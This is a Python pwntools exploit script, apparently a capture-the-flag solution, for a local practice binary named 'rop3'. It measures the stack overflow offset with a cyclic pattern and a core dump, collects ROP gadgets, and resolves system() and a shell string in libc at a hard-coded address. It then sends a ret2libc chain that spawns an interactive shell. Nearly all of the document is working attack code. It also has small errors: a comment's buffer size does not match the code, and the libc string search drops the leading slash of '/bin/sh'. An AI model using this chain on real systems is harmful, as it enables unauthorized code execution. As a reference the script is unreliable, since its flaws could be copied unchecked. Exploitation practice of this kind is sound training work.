from pwn import *

# Set up pwntools to work with this binary
elf = context.binary = ELF('rop3')
elf.address=0x555555400000
# Enable verbose logging so we can see exactly what is being sent.
context.log_level = 'debug'

# Figure out how big of an overflow we need by crashing the
# process once.
io = process(elf.path)

# We will send a 'cyclic' pattern which overwrites the return
# address on the stack.  The value 128 is longer than the buffer.
io.sendline(cyclic(512))

# Wait for the process to crash
io.wait()

# Open up the corefile
core = io.corefile

# Print out the address of RSP at the time of crashing: first data that we control
stack = core.rsp
info("stack address at crash time: %#x", stack)

# Read four bytes from RSP, which will be some of our cyclic data.
#
# With this snippet of the pattern, we know the exact offset from
# the beginning of our controlled data to the return address.
pattern = core.read(stack, 4)
info("%r pattern", pattern)
padding_length=cyclic_find(pattern)
info("%d padding length", padding_length)

rop = ROP(elf.path)

#
#pwndbg> vmmap
#LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
#    0x555555400000     0x555555401000 r-xp     1000 0      /root/Desktop/rop3
#    0x555555600000     0x555555601000 r--p     1000 0      /root/Desktop/rop3
#    0x555555601000     0x555555602000 rw-p     1000 1000   /root/Desktop/rop3


info("ret gadgets found: %#s",rop.ret)
ret_addr=rop.ret.address
info("ret address: %#x", ret_addr)

info("rdi gadgets found: %#s",rop.rdi)  #Gadget(0x4007c3, ['pop rdi', 'ret'], ['rdi'], 0x10)
pop_rdi_addr=rop.rdi.address
info("gadget address: %#x", pop_rdi_addr)

# with ldd rop3 we find the local libc that the binary relies on:
# ldd rop3           
#	linux-vdso.so.1 (0x00007ffff7fca000)
#	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7be4000)
#	/lib64/ld-linux-x86-64.so.2 (0x00007ffff7fcc000)
# base address of where libc will be mapped into the binaryâ€™s virtual memory space:
# 0x00007ffff7be4000
# we can also directly find the address where the system is loaded using p system in gdb

local_libc=ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')
# find string containing /bin/sh in the libc
local_libc.address= 0x00007ffff7be4000
# manually setting the address, all the offsets will start from here

offset_of_bin_sh=next(local_libc.search(b'bin/sh'))
print(offset_of_bin_sh)
info("/bin/sh address: %#x", offset_of_bin_sh)

# find system in the libc
offset_of_system_function=local_libc.symbols['system']
info("system address: %#x", offset_of_system_function)


# pwntools can build our rop chain for us
rop.raw(b"A"*padding_length)
rop.raw(ret_addr)
rop.raw(pop_rdi_addr) # pop rdi; ret
rop.raw(offset_of_bin_sh)
rop.raw(offset_of_system_function)
print (rop.dump())
# Craft a new payload which puts the "target" address at the correct offset
payload = rop.chain()
print(payload)
print(len(payload))
#
## inject our needed A's and then build the ropchain
#exploit = 'A'*0x28 + rop.chain()
#exploit += 'B' * (0x60 - len(exploit))

# Send the payload to a new copy of the process
io = process(elf.path)
io.send(payload)
io.interactive()
# io.stream()
#io.recvall()
#io.recvuntil("Here's your flag:")

# Get our flag!
#flag = io.recvline()
#success(flag)